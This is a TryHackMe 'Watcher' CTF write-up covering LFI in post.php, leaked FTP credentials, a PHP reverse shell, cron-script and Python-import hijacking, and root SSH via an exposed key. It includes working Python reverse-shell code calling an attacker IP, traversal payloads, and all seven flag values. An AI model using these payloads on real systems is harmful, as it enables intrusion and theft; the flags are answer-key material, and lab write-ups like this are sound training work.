# Watcher — TryHackMe Write-up

> **Spoiler warning:** This write-up contains the full exploitation path and all seven flags for the TryHackMe **Watcher** room. The techniques below were performed in an authorized CTF lab.

## Overview

This room starts with web enumeration and a **Local File Inclusion (LFI)** vulnerability. An exposed FTP account allows us to upload a PHP reverse shell, which the LFI endpoint executes. From the initial `www-data` shell, we move through three user accounts using **misconfigured sudo permissions**, a **writable cron script**, and **Python module hijacking**. Finally, an exposed, Base64-encoded **RSA private key** provides SSH access as `root`.

**Target:** `10.130.154.34`  
**Attacker (Kali):** `192.168.150.170`  
**Tools:** Nmap, ffuf, FTP, Netcat, Python, SSH

**Attack path:**

```text
Web enumeration
    -> LFI in post.php
    -> FTP credentials disclosure
    -> PHP upload + LFI execution
    -> www-data
    -> sudo as toby
    -> writable cron script executed as mat
    -> Python module hijacking executed as will
    -> exposed root SSH private key
    -> root
```

> Replace the IP addresses with those assigned to your own TryHackMe session.

---

## 1. Reconnaissance

### 1.1 Scan open ports

Run a full TCP port scan with Nmap's default scripts and service detection:

```bash
nmap -sC -sV -p- -T4 10.130.154.34
```

Relevant results:

```text
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Three services are exposed: **FTP**, **SSH**, and **HTTP**. We begin with the website on port 80.

### 1.2 Discover hidden web paths

Use `ffuf` to enumerate files and directories:

```bash
ffuf -u http://10.130.154.34/FUZZ -w /usr/share/wordlists/dirb/common.txt -ac
```

Interesting results:

```text
adminLxfxfrmx  [Status: 200]
css            [Status: 301]
images         [Status: 301]
index.php      [Status: 200]
robots.txt     [Status: 200]
```

The `robots.txt` file contains two useful paths:

```text
User-agent: *
Allow: /flag_1.txt
Allow: /secret_file_do_not_read.txt
```

Open `http://10.130.154.34/flag_1.txt` to obtain the first flag:

```text
FLAG{robots_dot_text_what_is_next}
```

However, accessing `/secret_file_do_not_read.txt` directly returns **403 Forbidden**. We need another way to read it.

---

## 2. Local File Inclusion and FTP Credentials

### 2.1 Identify the vulnerable parameter

While reviewing the website's HTML, we find a link that passes a filename to `post.php`:

```html
<a href="post.php?post=round.php"><img src="images/placemat2.jpg" width="100%" height="225"/></a>
```

This suggests that the `post` parameter is used to load a file. Replace `round.php` with the forbidden filename:

```text
http://10.130.154.34/post.php?post=secret_file_do_not_read.txt
```

The endpoint reveals the file despite the direct-access restriction:

```text
Hi Mat,

The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files.

Will

----------

ftpuser:givemefiles777
```

**Finding:** `post.php` has an **LFI vulnerability** that allows us to load files outside the intended content. It also exposes FTP credentials.

### 2.2 Log in to FTP and retrieve flag 2

```bash
ftp 10.130.154.34
```

Log in with:

```text
Username: ftpuser
Password: givemefiles777
```

List the files and download the second flag:

```text
ftp> ls
files
flag_2.txt

ftp> get flag_2.txt
ftp> bye
```

Read the downloaded file on Kali:

```bash
cat flag_2.txt
```

```text
FLAG{ftp_you_and_me}
```

### 2.3 Confirm arbitrary local file access

Use directory traversal through the same vulnerable parameter:

```text
http://10.130.154.34/post.php?post=../../../etc/passwd
```

The response includes the following user accounts:

```text
will:x:1000:1000:will:/home/will:/bin/bash
ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin
mat:x:1002:1002:,#,,:/home/mat:/bin/bash
toby:x:1003:1003:,,,:/home/toby:/bin/bash
```

We identify **will**, **mat**, and **toby** as potential targets for later privilege escalation.

---

## 3. From LFI to Remote Code Execution

### 3.1 Test FTP upload permissions

First, create a harmless test file on Kali:

```bash
touch test.txt && echo pwned > test.txt
ftp 10.130.154.34
```

Authenticate as `ftpuser`, then try uploading it in the FTP root:

```text
ftp> put test.txt
553 Could not create file.
```

The upload fails in the root directory, but succeeds inside `files`:

```text
ftp> cd files
ftp> put test.txt
226 Transfer complete.
ftp> ls
test.txt
```

This confirms write access to `/home/ftpuser/ftp/files`.

### 3.2 Upload a PHP reverse shell

Use the [Pentestmonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), save it as `pwn.php`, and set the connection details in the file:

```php
$ip = '192.168.150.170';
$port = 1234;
```

Upload it to the writable FTP folder:

```bash
ftp 10.130.154.34
```

```text
ftp> cd files
ftp> put pwn.php
226 Transfer complete.
ftp> ls
pwn.php
test.txt
```

### 3.3 Execute the uploaded PHP file through LFI

Start a Netcat listener on Kali:

```bash
nc -lvnp 1234
```

Then open this URL in a browser:

```text
http://10.130.154.34/post.php?post=/home/ftpuser/ftp/files/pwn.php
```

The PHP file is included and executed on the server, producing a reverse shell:

```text
connect to [192.168.150.170] from (UNKNOWN) [10.130.154.34]
$ whoami
www-data
```

**Why it works:** FTP lets us place a PHP payload on disk, and the vulnerable `post.php` endpoint includes that file. Since the PHP code is executed server-side, **LFI becomes RCE**.

---

## 4. From `www-data` to `toby`

### 4.1 Enumerate sudo permissions

From the reverse shell, check which commands `www-data` can run:

```bash
sudo -l
```

```text
User www-data may run the following commands on ip-10-130-154-34:
    (toby) NOPASSWD: ALL
```

This means **`www-data` can execute any command as `toby` without a password**. It does **not** grant direct root access.

Find the flags on the filesystem:

```bash
find / -type f -name 'flag*' 2>/dev/null
```

```text
/home/mat/flag_5.txt
/home/ftpuser/ftp/flag_2.txt
/home/will/flag_6.txt
/home/toby/flag_4.txt
/var/www/html/more_secrets_a9f10a/flag_3.txt
/var/www/html/flag_1.txt
```

### 4.2 Read flags 3 and 4

Run the following commands as `toby`:

```bash
sudo -u toby cat /var/www/html/more_secrets_a9f10a/flag_3.txt
sudo -u toby cat /home/toby/flag_4.txt
```

```text
FLAG{lfi_what_a_guy}
FLAG{chad_lifestyle}
```

Attempting to read Mat's flag fails:

```bash
sudo -u toby cat /home/mat/flag_5.txt
```

```text
cat: /home/mat/flag_5.txt: Permission denied
```

We need to move to the `mat` account.

---

## 5. From `toby` to `mat` — Cron Job Hijacking

### 5.1 Inspect Toby's files

```bash
cd /home/toby
ls
cat note.txt
```

```text
flag_4.txt  jobs  note.txt

Hi Toby,

I've got the cron jobs set up now so don't worry about getting that done.

Mat
```

Inspect the script in `jobs`:

```bash
cd /home/toby/jobs
ls
cat cow.sh
```

```bash
#!/bin/bash
cp /home/mat/cow.jpg /tmp/cow.jpg
```

The note points us toward a scheduled job. The script can be modified as `toby`, and its execution later gives us a shell as `mat`.

### 5.2 Replace the cron script with a reverse shell

Edit the script using Toby's permissions:

```bash
sudo -u toby nano /home/toby/jobs/cow.sh
```

Replace its contents with:

```bash
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.150.170",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
```

Start another listener on Kali:

```bash
nc -lvnp 9001
```

When the scheduled task runs, we receive a connection:

```text
connect to [192.168.150.170] from (UNKNOWN) [10.130.154.34]
$ whoami
mat
```

The job runs with **Mat's privileges**, allowing us to move from `toby` to `mat`.

### 5.3 Retrieve flag 5

```bash
cd /home/mat
ls
cat flag_5.txt
```

```text
cow.jpg  flag_5.txt  note.txt  scripts
FLAG{live_by_the_cow_die_by_the_cow}
```

---

## 6. From `mat` to `will` — Python Module Hijacking

### 6.1 Inspect Mat's files and the Python script

First, try to read Will's flag:

```bash
cat /home/will/flag_6.txt
```

```text
cat: /home/will/flag_6.txt: Permission denied
```

Read the note in `/home/mat`:

```bash
cd /home/mat
cat note.txt
```

```text
Hi Mat,

I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.

Will
```

Inspect the two Python files:

```bash
cd /home/mat/scripts
ls
cat will_script.py
cat cmd.py
```

`will_script.py` contains:

```python
import os
import sys
from cmd import get_command

cmd = get_command(sys.argv[1])

whitelist = ["ls -lah", "id", "cat /etc/passwd"]

if cmd not in whitelist:
    print("Invalid command!")
    exit()

os.system(cmd)
```

The original `cmd.py` contains:

```python
def get_command(num):
    if num == "1":
        return "ls -lah"
    if num == "2":
        return "id"
    if num == "3":
        return "cat /etc/passwd"
```

**Finding:** The main script imports `get_command` from a local, writable `cmd.py` module. Python executes top-level module code **during import**, before `will_script.py` checks the command whitelist.

### 6.2 Inject code into `cmd.py`

Modify `cmd.py` to run a reverse shell when it is imported. We keep the original `get_command` function so the script's expected interface still exists:

```python
import socket
import os
import pty

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.150.170", 9002))

for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)

pty.spawn("/bin/bash")

def get_command(num):
    if num == "1":
        return "ls -lah"
    if num == "2":
        return "id"
    if num == "3":
        return "cat /etc/passwd"
```

Start a listener on Kali:

```bash
nc -lvnp 9002
```

Then execute the allowed script as `will` from Mat's shell:

```bash
sudo -u will python3 /home/mat/scripts/will_script.py 1
```

The import triggers the payload and we receive a new shell:

```text
connect to [192.168.150.170] from (UNKNOWN) [10.130.154.34]
$ whoami
will
```

**Why it works:** The sudo permission runs the script as `will`. Importing the attacker-modified `cmd.py` executes its top-level code under Will's privileges; the command whitelist cannot stop code that has already run during import.

### 6.3 Retrieve flag 6

```bash
cd /home/will
ls
cat flag_6.txt
```

```text
flag_6.txt
FLAG{but_i_thought_my_script_was_secure}
```

---

## 7. From `will` to `root` — Exposed SSH Private Key

### 7.1 Discover a Base64-encoded key

While looking for additional files, we find `key.b64` in `/opt/backups`:

```bash
cd /opt/backups
ls
cat key.b64
```

The file contains a long Base64 string. Decode it:

```bash
base64 -d key.b64
```

Its contents begin and end with:

```text
-----BEGIN RSA PRIVATE KEY-----
... RSA private key contents ...
-----END RSA PRIVATE KEY-----
```

This is an exposed RSA private key. The full key is omitted from this write-up; it is available in the room's `key.b64` file.

### 7.2 Authenticate as root over SSH

Copy the **complete decoded private key** into a file named `id_rsa` on Kali. Set restrictive permissions:

```bash
chmod 400 id_rsa
```

Connect as `root` using the recovered key:

```bash
ssh -i id_rsa root@10.130.154.34
```

The authentication succeeds. Retrieve the last flag:

```bash
whoami
cd /root
ls
cat flag_7.txt
```

```text
root
flag_7.txt  snap
FLAG{who_watches_the_watchers}
```

**Root access obtained!**

---

## 8. Flags Summary

| Flag | Location | Value |
|---|---|---|
| 1 | `/var/www/html/flag_1.txt` | `FLAG{robots_dot_text_what_is_next}` |
| 2 | `/home/ftpuser/ftp/flag_2.txt` | `FLAG{ftp_you_and_me}` |
| 3 | `/var/www/html/more_secrets_a9f10a/flag_3.txt` | `FLAG{lfi_what_a_guy}` |
| 4 | `/home/toby/flag_4.txt` | `FLAG{chad_lifestyle}` |
| 5 | `/home/mat/flag_5.txt` | `FLAG{live_by_the_cow_die_by_the_cow}` |
| 6 | `/home/will/flag_6.txt` | `FLAG{but_i_thought_my_script_was_secure}` |
| 7 | `/root/flag_7.txt` | `FLAG{who_watches_the_watchers}` |

## 9. Key Takeaways

- **LFI can bypass direct file restrictions:** A forbidden file was still readable through a vulnerable file-loading parameter.
- **File upload + LFI can become RCE:** FTP provided a writable location for PHP code that the application later included and executed.
- **Review sudo permissions carefully:** `www-data` could run commands as `toby` without a password, enabling lateral movement.
- **Writable scheduled scripts are dangerous:** A cron job running as another user executed attacker-controlled code.
- **Python import paths are a trust boundary:** A writable local module made it possible to execute code as a more privileged user before a command whitelist was evaluated.
- **Private keys must be protected:** A readable backup of an SSH private key was enough to authenticate directly as `root`.

---

*Written from my own TryHackMe Watcher lab notes. All techniques were used in an authorized training environment.*
